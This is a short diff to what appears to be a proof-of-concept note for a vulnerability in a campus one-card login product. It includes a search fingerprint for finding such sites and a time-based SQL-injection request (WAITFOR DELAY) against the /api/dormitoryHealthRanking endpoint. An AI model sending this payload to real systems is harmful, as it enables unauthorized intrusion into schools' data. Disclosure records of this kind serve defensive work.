@@ -8,7 +8,7 @@
 body="http://www.ahkxsoft.com/" && body="一卡通登录"
 ```
 
-## poc
+## POC
 
 ```yaml
 GET /api/dormitoryHealthRanking?building=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1
